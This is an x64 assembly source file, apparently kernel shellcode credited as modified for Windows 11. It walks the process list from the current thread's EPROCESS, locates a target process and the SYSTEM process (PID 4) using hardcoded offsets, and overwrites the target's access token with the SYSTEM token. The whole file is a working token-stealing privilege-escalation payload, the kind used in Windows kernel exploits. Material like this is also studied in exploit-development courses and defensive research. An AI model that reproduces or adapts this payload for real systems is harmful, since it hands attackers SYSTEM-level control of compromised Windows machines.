
[BITS 64]

; Written by John Stigerwalt
; Modified by me to work on Windows 11 x64

start:

;Find EPROCESS of current process (Whatever executes this code - Ex: Runme.exe)
;Find PROCESS ID of process (cmd.exe).
;Read ACCESS TOKEN from process (cmd.exe)
;Find EPROCESS of privileged process (system).
;Read ACCESS TOKEN from privileged process.
;Replace ACCESS TOKEN of the unprivileged process with privileged ACCESS TOKEN.

mov r9, qword [gs:188h]
mov r9, qword [r9 + 220h]

; Find Eprocess of current process
mov rax, r9
loop1:
mov rax, qword [rax + 1d8h] ; +1d8h ActiveProcessLinks
sub rax, 1d8h
cmp qword [rax + 1d0h], 1234h  ; +1d0h UniqueProcessId  : Ptr64 Void
jne loop1
mov rcx, rax
add rcx, 248h ; Token

; Find Eprocess of system with PID of 4
mov rax, r9
loop2:
mov rax, qword [rax + 1d8h]	; +1d8h ActiveProcessLinks
sub rax, 1d8h
cmp qword [rax + 1d0h], 4   ; +1d0h UniqueProcessId  : Ptr64 Void
jne loop2
mov rdx, rax
add rdx, 248h ; Token

; Store Token for overwrite of cmd.exe
mov rdx, qword [rdx]

; overwrite cmd.exe token offset with system token offset
mov qword [rcx], rdx 

; Return
ret